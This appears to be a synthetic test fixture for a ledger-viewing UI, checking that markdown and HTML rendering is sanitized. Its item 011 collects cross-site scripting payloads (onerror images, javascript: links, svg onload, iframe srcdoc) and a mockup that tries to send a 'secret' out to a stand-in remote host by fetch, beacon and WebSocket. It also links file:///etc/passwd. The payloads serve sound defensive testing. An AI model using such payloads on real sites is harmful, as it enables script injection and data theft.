// Synthetic ledger for ui/test. Made-up content only: never copy a real project's ledger into this repo.
// Each entry: path (relative to the eleven/ folder) -> { text, mtime }.

const now = Date.now();
const f = (text, minAgo = 30) => ({ text, mtime: now - minAgo * 60000 });
const T = (rows, head = ["#", "Task", "Role", "Done condition", "Status"]) =>
  `| ${head.join(" | ")} |\n|${head.map(() => "---").join("|")}|\n` + rows.map((r) => `| ${r.join(" | ")} |`).join("\n") + "\n";
const brief = (title, status = "approved by user on 2026-11-01", q = null) =>
  f(`# Brief: ${title}\n\nStatus: ${status}\n\n## Problem\nMade up.\n${q != null ? "\n## Open questions\n" + q + "\n" : ""}\n## Future\n- not a question\n`);

const manyQ = Array.from({ length: 12 }, (_, i) => `${i + 4}. Extra question number ${i + 4}, long enough to wrap on a phone screen.`).join("\n");

export const ledger = {
  // kit files and dotfiles: the UI must not list these
  "AGENTS.md": f("# kit"), "README.md": f("# readme"), "agents/cto.md": f("# cto"), "templates/brief.md": f("# template"),
  "docs/guide.md": f("# docs"), "ui/index.html": f("<p>ui</p>"), ".hidden/x.md": f("# hidden"), "work/001-done/.secret.md": f("# dotfile"),

  "project.md": f("# Project: Sample\n\nA made-up ledger for ui/test.\n", 600),
  "decisions/0001-sample.md": f("# 0001: A sample decision\n\nApplies to item 002.\n", 500),
  "decisions/archive/0002-old.md": f("# 0002: Old decision\n", 500),

  // 001: every "done" spelling, Round 10/10 → Done, and the round is not red (B7)
  "work/001-done/brief.md": brief("Finished item"),
  "work/001-done/tasks.md": f("Round: 10 / 10\n\n" + T([["1", "Explore", "architect", "", "done (draft; waiting for user approval)"], ["2", "Build", "frontend", "", "Done"],
    ["3", "Check", "qa", "", "**done** (reports/03-qa.md)"], ["4", "Ship", "CTO", "", "passed"], ["5", "Deploy", "devops", "", "✅ shipped"], ["6", "Merge", "devops", "", "merged"]])),

  // 002: working, sub-folders, an .html file, a report, a decision
  "work/002-working/brief.md": brief("Working item"),
  "work/002-working/tasks.md": f("Round: 3 / 10\n\n" + T([["1", "Explore, see `design/notes-a.md`", "architect", "", "done (reports/01-architect.md)"],
    ["2", "Build `design/mock.html` from decision 0001", "frontend", "", "NEXT"], ["3", "Verify", "qa", "", "todo (next after 2)"]]), 5),
  "work/002-working/notes.md": f("# Notes\n\nFirst paragraph SELECT-ME stays the same while the file changes.\n\nSecond paragraph, also stable.\n\n- a list item\n- another\n\nSee [the brief](brief.md) and `design/deep/inner.md`.\n", 5),
  "work/002-working/reports/01-architect.md": f("# Report: task 1, architect\n\n## Result\ndone\n"),
  "work/002-working/design/notes-a.md": f("# Design notes\n\nSee `deep/inner.md`.\n"),
  "work/002-working/design/deep/inner.md": f("# Inner\n\nA file two folders down.\n"),
  // a mockup with its own JavaScript (CEO 2026-11-01: mockups keep their JS)
  "work/002-working/design/mock.html": f(`<!doctype html><title>mock</title><p>MOCK-HTML-BODY</p><button id="b">press</button><script>
document.getElementById("b").onclick = () => { document.getElementById("b").textContent = "pressed"; parent.postMessage({ mock: "clicked" }, "*"); };
</script>`),

  // 003: waiting on the user, numbered multi-line questions (count 15), a report question that must not merge
  "work/003-waiting/brief.md": f(`# Brief: Waiting with questions\n\nStatus: approved\n\n## Open questions\nOnly the user can answer these.\n\n1. **First** question that wraps\n   onto a second line.\n   - nested bullet\n   - another nested\n2. Second question with \`code\`.\n\n   \`\`\`\n   ## not a heading inside a fence\n   \`\`\`\n3. Third question.\n${manyQ}\n\n## Future\n- not a question\n`),
  "work/003-waiting/tasks.md": f("Round: 2 / 10\n\n" + T([["1", "Write the brief", "product", "", "done"], ["2", "User: answer the brief's open questions", "user", "", "NEXT"]])),
  "work/003-waiting/reports/01-product.md": f("# Report: task 1, product\n\n## Result\ndone\n\n## Open questions for the user\n1. REPORT-QUESTION-MUST-NOT-MERGE\n"),

  // 004: waiting, questions written as prose only (B5: shown, no count)
  "work/004-prose-q/brief.md": brief("Prose questions", "approved", "We still need to know which market comes first, and whether a free tier is wanted. PROSE-Q-MARKER"),
  "work/004-prose-q/tasks.md": f(T([["1", "CEO: pick the first market", "CEO", "", "**NEXT**"]])),

  // 005: waiting, "- None." questions → no disclosure
  "work/005-none-q/brief.md": brief("No questions", "approved", "- None."),
  "work/005-none-q/tasks.md": f(T([["1", "User: approve the plan", "user", "", "NEXT"]])),

  // 006 / 007: no tasks.md, draft vs approved brief
  "work/006-gate/brief.md": brief("Draft brief", "draft, for the user"),
  "work/007-planning/brief.md": brief("Approved, no tasks yet"),

  // 008: no NEXT, not all done → idle. 009: two NEXT rows → first wins + warning
  "work/008-idle/brief.md": brief("Idle item"),
  "work/008-idle/tasks.md": f("Round: 4 / 10\n\n" + T([["1", "One", "backend", "", "done"], ["2", "Do the NEXT thing", "qa", "NEXT once 1 is done", "todo"]])),
  "work/009-two-next/brief.md": brief("Two NEXT rows"),
  "work/009-two-next/tasks.md": f("Round: 1 / 10\n\n" + T([["1", "Explore", "architect", "", "NEXT"], ["2", "User: answer", "user", "", "next"]])),

  // 010: Arabic text, a file name with spaces, a non-ASCII file name (B6)
  "work/010-arabic/brief.md": f("# Brief: ملاحظات الاجتماع\n\nStatus: approved\n"),
  "work/010-arabic/tasks.md": f("Round: 1 / 10\n\n" + T([["1", "Write `my notes.md` and ملف.md", "writer", "", "NEXT"]])),
  "work/010-arabic/notes.md": f("# ملاحظات\n\nهذا نص عربي طويل لاختبار الاتجاه من اليمين إلى اليسار، وينتهي بعلامة ترقيم.\n\nEnglish paragraph. See [spaced](my%20notes.md), `my notes.md` and `ملف.md`, and ملف.md in prose.\n"),
  "work/010-arabic/my notes.md": f("# File with spaces\n\nSPACES-FILE-BODY\n"),
  "work/010-arabic/ملف.md": f("# ملف عربي\n\nARABIC-FILE-BODY\n"),

  // 012: security M4. An SVG <a> in the NEXT task cell used to blank Home ("Lost access"); the rect used to cover the page.
  "work/012-svg/brief.md": brief("SVG in a task"),
  "work/012-svg/tasks.md": f(T([["1", `Fix <svg><a href="https://example.com/eleven-test-svg-task"><text y="15">x</text></a></svg> the <svg width="10" height="10" overflow="visible"><rect x="-3000" y="-3000" width="9000" height="9000" fill="red"/></svg> thing`, "frontend", "", "NEXT"]])),

  // 011: attacks (QA report 04). window.__x(c) records any code that runs.
  "work/011-attack/brief.md": f(`# Brief: <img src=x onerror="window.__x('T')"> title\n\nStatus: draft\n\n## Open questions\n1. <img src=x onerror="window.__x('Q')"> q\n2. [js](javascript:window.__x('QL'))\n`),
  "work/011-attack/tasks.md": f(T([["1", `User: <img src=x onerror="window.__x('S')"> and [js](javascript:window.__x('SL'))`, "user", "", "NEXT"]])),
  "work/011-attack/notes.md": f(`# Attack notes

<script>window.__x('1')</script>

<img src=x onerror="window.__x('2')">

[click me](javascript:window.__x('3'))

<a href="javascript:window.__x('4')">raw js link</a>

<svg onload="window.__x('5')"><image href="https://example.com/eleven-test-svg.png" width="10" height="10"/></svg>

<iframe srcdoc="<script>parent.__x('6')</script>"></iframe>

<details open ontoggle="window.__x('7')"><summary>x</summary></details>

<form action="https://example.com/eleven-test-form"><input name=pw><button id="formBtn">go</button></form>

<style>.top{background:rgb(255,0,0)!important}</style>

<div class="lostbar" id="pane" style="position:fixed;inset:0" data-path="project.md">CLASS-ID-STYLE-MARKER</div>

<object data="https://example.com/eleven-test-object"></object><embed src="https://example.com/eleven-test-embed">

<video src="https://example.com/eleven-test-video.mp4" poster="https://example.com/eleven-test-poster.png"></video>

<table background="https://example.com/eleven-test-bg.png"><tr><td>cell</td></tr></table>

<img src="https://example.com/eleven-test-pixel.png" alt="pixel">

AFTER-ATTACK-MARKER
`),
  // B2: links that must never navigate the app
  "work/011-attack/links.md": f("# Links\n\n- [missing](missing.md)\n- [mail](mailto:someone@example.com)\n- [file](file:///etc/passwd)\n- [external](https://example.com/eleven-test-external)\n- [ledger](../002-working/notes.md)\n"),
  "work/011-attack/<img src=x onerror=window.__x('F1')>.md": f("# bad name 1\n"),
  "work/011-attack/\"><svg onload=window.__x('F2')>.md": f("# bad name 2\n"),
  // security M4: inline SVG/MathML (overlay, an SVG <a>, a 5000 px wide box, MathML href) and an unclosed <style> in <math> (QA N4)
  "work/011-attack/svg.md": f(`# SVG and MathML

<svg width="10" height="10" overflow="visible"><rect x="-3000" y="-3000" width="9000" height="9000" fill="red"/></svg>

<svg><a href="https://example.com/eleven-test-svg-a"><text y="20">SVG-LINK</text></a></svg>

<svg width="5000" height="10"></svg>

<math><mi href="javascript:window.__x('M')">MATH-TEXT</mi></math>

AFTER-SVG-MARKER
`),
  "work/011-attack/math.md": f(`# Math\n\nBEFORE-MATH\n\n<math><mtext><table><mglyph><style><img src=x onerror="window.__x('N4')">\n\nAFTER-MATH-MARKER\n`),
  // security L3: headings named like the UI's own ids, in-doc anchors; L6: a malformed anchor
  "work/011-attack/ids.md": f(`# toast\n\n- [jump](#far-heading)\n- [to gsvg](#gsvg)\n- [cross](links.md#links)\n- [bad anchor](#%E0%A4%A)\n- [missing](missing.md)\n\n` +
    ["gsvg", "gvp", "legend", "pane", "view", "tree"].map((h) => `## ${h}\n`).join("\n") + "\n" +
    Array.from({ length: 60 }, (_, i) => `Filler paragraph ${i + 1}.`).join("\n\n") + "\n\n## Far heading\n\nFAR-MARKER\n\n" + Array.from({ length: 40 }, (_, i) => `Tail paragraph ${i + 1}.`).join("\n\n") + "\n"),
  // QA N2: GFM task lists keep their boxes; any other <input> is dropped
  "work/011-attack/checks.md": f(`# Checks\n\n- [x] CHECKED-ITEM\n- [ ] OPEN-ITEM\n\n<input type="text" name="pw" value="TEXT-INPUT"> <input type="checkbox" onclick="window.__x('CB')" name="x" form="f" style="display:none">\n`),
  // security M2: a mockup that tries every way out. __REMOTE__ is the harness's logging server (run.mjs).
  "work/011-attack/net.html": f(`<!doctype html><html><head><title>net</title>
<link rel="stylesheet" href="__REMOTE__/css"><style>@font-face{font-family:x;src:url(__REMOTE__/font)} body{background:url(__REMOTE__/bg);font-family:x}</style>
<script src="__REMOTE__/script.js"></script></head><body><p>NET-MOCK</p><img src="__REMOTE__/img-tag"><button id="b">press</button><script>
parent.postMessage({ net: "ran" }, "*");
document.getElementById("b").onclick = () => { document.getElementById("b").textContent = "pressed"; parent.postMessage({ net: "clicked" }, "*"); };
fetch("__REMOTE__/fetch").catch(() => {});
fetch("__REMOTE__/post", { method: "POST", body: "secret", mode: "no-cors" }).catch(() => {});
try { navigator.sendBeacon("__REMOTE__/beacon", "b"); } catch (e) {}
try { const w = new WebSocket("__REMOTE__/ws".replace("http", "ws")); w.onerror = () => {}; } catch (e) {}
new Image().src = "__REMOTE__/img";
try { const x = new XMLHttpRequest(); x.open("GET", "__REMOTE__/xhr"); x.onerror = () => {}; x.send(); } catch (e) {}
const f = document.createElement("iframe"); f.src = "__REMOTE__/subframe"; document.body.append(f);
setTimeout(() => { location.href = "__REMOTE__/selfnav"; }, 300);
</script></body></html>`),
  "work/011-attack/evil.html": f(`<!doctype html><body><p>evil</p><script>
let r = { ran: true };
try { r.parentDoc = !!parent.document.body; } catch (e) { r.parentDoc = "blocked"; }
try { parent.__x("H"); } catch (e) {}
try { r.ls = typeof localStorage.length; } catch (e) { r.ls = "blocked"; }
parent.postMessage({ evil: r }, "*");
</script></body>`),
};
